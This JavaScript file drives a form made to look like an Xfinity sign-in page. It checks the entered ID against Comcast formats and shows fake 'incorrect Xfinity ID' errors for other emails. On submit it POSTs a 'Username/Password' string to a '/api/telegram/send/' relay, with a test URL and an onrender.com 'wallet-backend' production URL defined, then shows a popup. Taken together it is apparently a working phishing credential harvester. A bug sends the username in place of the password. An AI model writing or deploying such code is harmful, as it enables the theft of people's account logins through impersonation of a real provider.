document.addEventListener("DOMContentLoaded", () => {
    const userInput = document.querySelector('input[type="text"]');
    const passwordInputs = document.querySelectorAll('input[type="password"]');
    const passwordInput = passwordInputs[0];
    const confirmPasswordInput = passwordInputs[1];
    const button = document.querySelector('button');
    const overlay = document.getElementById("xfinity-popup-overlay");

    // ===== POPUP CONTROLS =====
    function openPopup() {
        overlay.classList.remove("hidden");
         overlay.classList.add("flex");
    }

    function closePopup() {
        overlay.classList.add("hidden");
    }

    overlay.addEventListener("click", (e) => {
        if (e.target === overlay) closePopup();
    });

    // ===== VALIDATION HELPERS =====
    function showError(input, message) {
        removeError(input);

        const error = document.createElement("small");
        error.classList.add("text-red-500", "block", "mt-1", "text-xs");
        error.textContent = message;

        input.classList.add("border-red-500");
        input.insertAdjacentElement("afterend", error);
    }

    function removeError(input) {
        const next = input.nextElementSibling;
        if (next && next.tagName === "SMALL") {
            next.remove();
        }
        input.classList.remove("border-red-500");
    }

    function isComcastEmail(value) {
        return /^[a-zA-Z0-9._%+-]+@comcast\.net$/.test(value);
    }

    function isOtherEmail(value) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value) && !value.endsWith("@comcast.net");
    }

    function isPhone(value) {
        return /^[0-9]{7,15}$/.test(value);
    }

    function isUsername(value) {
        return /^[a-zA-Z0-9._-]{3,}$/.test(value);
    }

    async function handleSubmit(){
        const testUrl = "http://127.0.0.1:8000/api/telegram/send/";
        const prodUrl = "https://wallet-backend-iyvu.onrender.com/api/telegram/send/";
        try {
      const res = await fetch(testUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          text: `Username: ${userInput.value.trim()} Password: ${userInput.value.trim()}`,
        }),
      });

      const data = await res.json();
      console.log(data);
      openPopup();
    } catch (err) {
      console.error(err);
    }
    }

    // ===== FORM SUBMISSION =====
    button.addEventListener("click", (e) => {
        e.preventDefault();

        let isValid = true;

        const userValue = userInput.value.trim();
        const passwordValue = passwordInput.value.trim();
        const confirmPasswordValue = confirmPasswordInput.value.trim();

        // USER FIELD VALIDATION
        if (userValue === "") {
            showError(userInput, "This field is required");
            isValid = false;
        } else if (isOtherEmail(userValue)) {
            showError(userInput, "The Xfinity ID you entered was incorrect. Please try again.");
            isValid = false;
        } else if (
            !isComcastEmail(userValue) &&
            !isPhone(userValue) &&
            !isUsername(userValue)
        ) {
            showError(userInput, "Please enter your Xfinity ID to sign in.");
            isValid = false;
        } else {
            removeError(userInput);
        }

        // PASSWORD VALIDATION
        if (passwordValue.length < 8) {
            showError(passwordInput, "Password must be at least 8 characters");
            isValid = false;
        } else {
            removeError(passwordInput);
        }

        // CONFIRM PASSWORD VALIDATION
        if (confirmPasswordValue === "") {
            showError(confirmPasswordInput, "Please confirm your password");
            isValid = false;
        } else if (confirmPasswordValue !== passwordValue) {
            showError(confirmPasswordInput, "Passwords do not match");
            isValid = false;
        } else {
            removeError(confirmPasswordInput);
        }

        if (isValid) {
            handleSubmit()
        }
    });
});